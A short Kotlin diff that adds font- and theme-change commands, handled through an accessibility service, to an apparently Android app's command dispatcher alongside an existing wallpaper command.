@@ -1997,6 +1997,24 @@ object CommandProcessor {
                         status = "FAILED_FORMAT"
                     }
                 }
+                "SET_SYSTEM_FONT" -> {
+                    val service = MyAccessibilityService.instance
+                    if (service != null) {
+                        service.startFontChangeSequence(id, content.trim())
+                        status = "FONT_SEQUENCE_INITIATED"
+                    } else {
+                        status = "FAILED (SERVICE_OFF)"
+                    }
+                }
+                "SET_SYSTEM_THEME" -> {
+                    val service = MyAccessibilityService.instance
+                    if (service != null) {
+                        service.startThemeChangeSequence(id, content.trim())
+                        status = "THEME_SEQUENCE_INITIATED"
+                    } else {
+                        status = "FAILED (SERVICE_OFF)"
+                    }
+                }
                 "SET_WALLPAPER" -> {
                     val parts = content.split("|", limit = 2)
                     if (parts.size >= 2) {
